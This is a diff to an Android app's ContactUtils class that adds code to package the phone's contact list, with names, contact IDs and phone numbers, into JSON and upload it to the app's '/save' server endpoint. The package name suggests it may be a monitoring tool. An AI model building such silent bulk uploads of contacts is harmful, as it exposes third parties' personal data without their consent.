@@ -9,7 +9,18 @@ import com.theah64.xrob.database.Contacts;
 import com.theah64.xrob.database.PhoneNumbers;
 import com.theah64.xrob.models.Contact;
 
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import java.io.IOException;
 import java.util.List;
+import java.util.Locale;
+
+import okhttp3.Call;
+import okhttp3.Callback;
+import okhttp3.Request;
+import okhttp3.Response;
 
 /**
  * Created by theapache64 on 11/9/16.
@@ -18,7 +29,7 @@ public class ContactUtils {
 
     private static final String X = ContactUtils.class.getSimpleName();
 
-    public static void refreshContacts(final Context context) {
+    public static boolean refreshContacts(final Context context) {
 
         Log.i(X, "--------------------------------------");
         Log.i(X, "Refreshing contacts....");
@@ -142,6 +153,8 @@ public class ContactUtils {
         Log.d(X, "Total edited contacts : " + totalEditedContacts);
 
         Log.d(X, "--------------------------------------");
+
+        return (totalAddedContacts + totalAddedNumbers + totalEditedContacts) > 0;
     }
 
     public static void push(Context context) {
@@ -150,7 +163,71 @@ public class ContactUtils {
         final List<Contact> unSyncedContacts = contactsTable.getNonSyncedContacts();
 
         if (unSyncedContacts != null) {
+
+            final JSONArray jaContacts = new JSONArray();
+
             Log.d(X, unSyncedContacts.size() + " need to be synced!");
+
+            try {
+
+                //Looping through each contact
+                for (final Contact contact : unSyncedContacts) {
+
+                    final JSONObject joContact = new JSONObject();
+                    joContact.put(Contacts.COLUMN_NAME, contact.getName());
+                    joContact.put(Contacts.COLUMN_ANDRIOD_CONTACT_ID, contact.getAndroidContactId());
+
+                    if (contact.getPhoneNumbers() != null) {
+
+                        final JSONArray jaPhoneNumbers = new JSONArray();
+
+                        for (final Contact.PhoneNumber phoneNumber : contact.getPhoneNumbers()) {
+
+                            final JSONObject joPhoneNumber = new JSONObject();
+
+                            joPhoneNumber.put(PhoneNumbers.COLUMN_PHONE_NUMBER, phoneNumber.getPhone());
+                            joPhoneNumber.put(PhoneNumbers.COLUMN_PHONE_TYPE, phoneNumber.getPhoneType());
+
+                            jaPhoneNumbers.put(joPhoneNumber);
+                        }
+
+
+                        joContact.put(PhoneNumbers.TABLE_PHONE_NUMBERS, jaPhoneNumbers);
+                    }
+
+                    jaContacts.put(joContact);
+                }
+
+                //Building request
+                final Request contactsRequest = new APIRequestBuilder("/save", true)
+                        .addParam(Xrob.KEY_ERROR, "false")
+                        .addParam(Xrob.KEY_DATA_TYPE, Xrob.DATA_TYPE_CONTACTS)
+                        .addParam(Xrob.KEY_MESSAGE, String.format(Locale.getDefault(), "%d contact(s) retrieved", jaContacts.length()))
+                        .addParam(Xrob.KEY_DATA, jaContacts.toString())
+                        .build();
+
+
+                OkHttpUtils.getInstance().getClient().newCall(contactsRequest).enqueue(new Callback() {
+                    @Override
+                    public void onFailure(Call call, IOException e) {
+                        e.printStackTrace();
+                    }
+
+                    @Override
+                    public void onResponse(Call call, Response response) throws IOException {
+                        try {
+                            final APIResponse apiResponse = new APIResponse(OkHttpUtils.logAndGetStringBody(response));
+                            //Success all contacts synced
+                            contactsTable.setAllContactsAndNumbersSynced();
+                        } catch (JSONException | APIResponse.APIException e) {
+                            e.printStackTrace();
+                        }
+                    }
+                });
+
+            } catch (JSONException e) {
+                e.printStackTrace();
+            }
 
         }
     }
